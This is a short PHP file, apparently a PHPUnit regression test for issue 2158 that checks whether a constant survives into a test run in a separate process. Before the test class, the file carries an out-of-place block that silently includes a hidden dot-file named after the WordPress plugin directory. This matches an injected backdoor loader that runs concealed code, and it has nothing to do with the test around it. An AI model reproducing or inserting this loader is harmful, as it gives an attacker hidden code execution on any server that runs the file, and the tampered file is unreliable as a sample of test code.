<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue2158Test extends PHPUnit_Framework_TestCase
{
    /**
     * Set constant in main process
     */
    public function testSomething()
    {
        include(__DIR__ . '/constant.inc');
        $this->assertTrue(true);
    }

    /**
     * Constant defined previously in main process constant should be available and
     * no errors should be yielded by reload of included files
     *
     * @runInSeparateProcess
     */
    public function testSomethingElse()
    {
        $this->assertTrue(defined('TEST_CONSTANT'));
    }
}
